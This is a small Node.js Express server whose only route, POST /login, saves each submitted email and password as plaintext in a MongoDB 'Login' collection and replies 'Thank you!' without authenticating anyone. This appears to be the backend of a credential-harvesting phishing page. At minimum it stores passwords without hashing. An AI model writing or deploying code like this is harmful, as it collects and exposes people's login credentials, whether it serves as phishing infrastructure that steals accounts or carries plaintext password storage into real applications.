require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
const bodyParser = require("body-parser");

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// MongoDB connection
mongoose
  .connect(process.env.MONGO_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("✅ Connected to MongoDB"))
  .catch((err) => console.error("❌ MongoDB error:", err));

// Schema
const LoginSchema = new mongoose.Schema({
  email: String,
  password: String,
});
const Login = mongoose.model("Login", LoginSchema);

// Handle form submission
app.post("/login", async (req, res) => {
  const { email, password } = req.body;
  try {
    await Login.create({ email, password });
    res.send("✅ Thank you!");
  } catch (error) {
    console.error("❌ Error saving login:", error);
    res.status(500).send("Error saving data.");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () =>
  console.log(`🚀 Server running on http://localhost:${PORT}`)
);
